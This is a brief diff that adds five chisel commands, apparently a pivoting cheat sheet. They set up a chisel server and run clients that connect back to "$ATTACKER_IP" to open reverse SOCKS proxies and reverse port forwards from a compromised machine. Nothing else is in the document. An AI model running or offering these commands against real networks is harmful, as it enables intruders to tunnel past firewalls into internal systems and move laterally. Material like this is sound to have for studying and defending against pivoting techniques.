@@ -1,0 +1,5 @@
+chisel server -p 8080 --reverse
+chisel client "$ATTACKER_IP":8080 R:socks
+chisel client "$ATTACKER_IP":8080 R:"$PORT":127.0.0.1:"$PORT"
+chisel server -p "$PORT" --socks5
+chisel client "$ATTACKER_IP":"$PORT" socks
